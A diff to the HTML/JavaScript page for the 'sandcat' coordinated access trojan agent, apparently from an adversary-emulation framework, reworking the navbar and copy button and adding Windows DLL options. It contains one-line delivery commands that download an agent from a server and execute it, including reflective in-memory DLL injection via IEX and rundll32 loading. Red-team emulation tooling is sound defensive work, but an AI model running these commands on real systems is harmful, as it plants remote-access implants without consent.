@@ -4,24 +4,22 @@
         <link rel="shortcut icon" type="image/png" href="/gui/img/favicon.png"/>
         <link rel="stylesheet" href="/gui/css/shared.css">
         <link rel="stylesheet" href="/gui/css/navbar.css">
+        <link rel="stylesheet" href="/gui/css/basic.css">
         <link rel="stylesheet" href="/sandcat/css/basic.css">
         <link rel="stylesheet" href="/gui/css/modal.css">
     </head>
     <body>
+    <div class="navbar">
+        <a onclick="localStorage.setItem('intro', '1')" href="/">Home</a>
+        <a href="/logout" style="float:right">Logout</a>
+    </div>
     <center style="margin-bottom: 100px">
-        <div class="topnav">
-          <a href="/">Home</a>
-          <div class="topnav-right">
-            <a href="/logout">Logout</a>
-          </div>
-        </div>
-        <div id="notice" class="notice" style="display:none">Chrome is the only supported browser. Please change to that or some website components may not work.</div>
-
         <div>
             <div id="sandcat-blocks" class="row-canvas">
                 <div class="section-profile">
                     <div class="row">
-                        <div class="duk"><img onclick="openDuk1()" class="duk-icon" src="/gui/img/duk.png"></div>
+                        <div class="topright duk-icon"><img onclick="openDuk1()" src="/gui/img/duk.png"></div>
+
                         <div class="column section-border" style="flex:37%;text-align:left;padding:15px;">
                             <h1 style="font-size:70px;margin-top:-20px;">54ndc47</h1>
                             <h2 style="margin-top:-55px">coordinated access trojan (CAT)</h2>
@@ -31,14 +29,17 @@
                                 You can deploy a CAT by running the 1-line <i>delivery command</i> associated to
                                 your target OS.
                             </p>
+
                             <select id="dcommands" style="width:60%;" onchange="displayCommand()">
                                 <option disabled="disabled" selected>Select target OS</option>
                                 <option value="darwin">MacOS</option>
                                 <option value="linux">Linux</option>
                                 <option value="windows-psh">Windows (PowerShell)</option>
                                 <option value="windows-cmd">Windows (CMD)</option>
+                                <option value="windows-dll-mem">Windows DLL (In-Memory)</option>
+                                <option value="windows-dll-disk">Windows DLL (Disk)</option>
                             </select>
-                            <button id="copyCommand" type="button" class="button-success" onclick="copyCommand()"
+                            <button id="copyCommand" type="button" class="button-success"
                                     style="display:none">Copy Command</button>
                         </div>
                         <div class="column" style="flex:67%;padding:15px;text-align: left">
@@ -84,7 +85,11 @@
                 x.text('dir=$(pwd); cd /tmp/sandcat; agent=$(curl -svkOJ -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download 2>&1 | grep -i \'Content-Disposition\' | sed \'s_.*filename[\\s]*=[\\s]*[\\"]*\\([^\\s\\"]*\\)[\\s\\n]*.*_\\1_\'); if [ -z \'$agent\' ]; then echo \'Download was not successful.\'; else chmod +x $agent; cd $dir; eval /tmp/sandcat/$agent -server '+loc+' -group my_group -v; fi;');
             } else if (selected_option === 'darwin') {
                 x.text('dir=$(pwd); cd /tmp/sandcat; agent=$(curl -svkOJ -X POST -H \'file:sandcat.go\' -H \'platform:linux\' '+loc+'/file/download 2>&1 | grep -i \'Content-Disposition\' | sed \'s_.*filename[\\s]*=[\\s]*[\\"]*\\([^\\s\\"]*\\)[\\s\\n]*.*_\\1_\'); if [ -z \'$agent\' ]; then echo \'Download was not successful.\'; else chmod +x $agent; cd $dir; eval /tmp/sandcat/$agent -server '+loc+' -group my_group -v; fi;');
-            }
+            } else if(selected_option === 'windows-dll-mem') {
+ 				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); $wc.Headers.add("defaultSleep","60"); $wc.Headers.add("defaultGroup","my_group"); $PEBytes = $wc.DownloadData($url); $wc1 = New-Object System.net.webclient; $wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1"); IEX ($wc1.DownloadString($url)); Invoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId');
+  			} else if(selected_option === 'windows-dll-disk') {
+  				x.text('$url="' + loc + '/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","shared.go"); $wc.Headers.add("defaultServer","'+loc+'"); $output="C:\\Users\\Public\\sandcat.dll"; $wc.DownloadFile($url,$output); rundll32.exe C:\\Users\\Public\\sandcat.dll,VoidFunc');
+  			}
             $('#copyCommand').show();
         }
         function openDuk1(){
@@ -94,10 +99,20 @@
                 'useful for running initial access adversaries, which can attempt to drop CATs on other, remote hosts.');
         }
 
-        function copyCommand() {
-            let copyText = $('#delivery-command').text();
-            navigator.clipboard.writeText(copyText);
-            document.execCommand("copy");
-        }
+        let copyCommandBtn = document.querySelector('#copyCommand');
+        copyCommandBtn.addEventListener('click', function(event) {
+          let command = document.querySelector('#delivery-command');
+          let range = document.createRange();
+          range.selectNode(command);
+          window.getSelection().addRange(range);
+
+          try {
+            document.execCommand('copy');
+          } catch(err) {
+            console.log('Oops, unable to copy');
+          }
+          window.getSelection().removeAllRanges();
+        });
+        
     </script>
 </html>
